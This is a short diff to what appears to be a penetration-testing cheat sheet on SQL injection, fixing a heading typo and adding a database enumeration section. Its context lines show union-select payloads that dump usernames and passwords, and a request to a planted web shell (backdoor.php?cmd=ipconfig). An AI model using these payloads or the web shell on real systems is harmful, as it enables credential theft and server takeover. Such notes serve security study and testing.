@@ -185,7 +185,7 @@ debug.php?id=1 union all select 1, 2, column_name from information_schema.column
 debug.php?id=1 union all select 1, username, password from users
 ```
 
-### SQL Code Injuection
+### SQL Code Injection
 
 Can we use the load_file function?  
 `debug.php?id=1 union all select 1, username, password from users`  
@@ -195,6 +195,14 @@ During testing we will likely see the server's web root. We can try dropping a o
 
 And access it:
 `191.168.231.10/backdoor.php?cmd=ipconfig`
+
+# Enumerating a database
+
+```SQL
+SHOW Grants;
+SHOW variables;
+# hostname, plugin_dir, tmpdir, version, version_compile_machine etc.
+```
 
 ### Automating SQL Injection
 
